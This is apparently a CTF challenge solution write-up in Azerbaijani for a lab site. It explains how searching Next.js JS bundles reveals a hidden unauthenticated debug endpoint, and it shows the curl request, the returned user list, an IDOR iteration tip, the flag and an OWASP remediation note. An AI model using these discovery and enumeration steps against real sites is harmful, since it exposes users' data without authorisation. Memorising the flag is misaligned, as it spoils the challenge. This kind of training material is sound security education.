# Challenge 5 — Hidden Unauthenticated Debug Endpoint (Çətin)

## Məqsəd
Gizli, autentifikasiyasız debug API endpoint-ini tapıb istifadəçi siyahısını əldə etmək.

## Həll yolu
**JS bundle analizi:**
1. `/_next/static/chunks/` altındakı JS fayllarını yüklə
2. Açar söz axtar: `debug`, `TODO`, `/api/v1/`, `disable before prod`
3. Tap: `// TODO: disable before prod — /api/v1/debug/users`

**Endpoint-ə müraciət:**
```bash
curl https://[site-url]/api/v1/debug/users
# və ya birbaşa browser-də aç
```

**Cavab:**
```json
{
  "ok": true,
  "env": "debug",
  "count": 4,
  "users": [
    { "id": 2, "email": "ctf_admin@detech.io", "role": "super_admin", ... },
    ...
  ]
}
```

**IDOR genişlənməsi (əgər real DB olsaydı):**
ID-ləri iterate et: `/api/v1/debug/users/1`, `/api/v1/debug/users/2`

## Zəiflik yeri
`app/api/v1/debug/users/route.ts` — middleware-dən kənarda, heç bir auth yoxlaması yox

## CTF Flag
`CTF{unauthenticated_debug_endpoint_idor}`

## Real dünya analoquu
OWASP Top 10: A01:2021 — Broken Access Control (IDOR)
Debug endpoint-lər production-da mütləq silinməli və ya auth ilə qorunmalıdır.
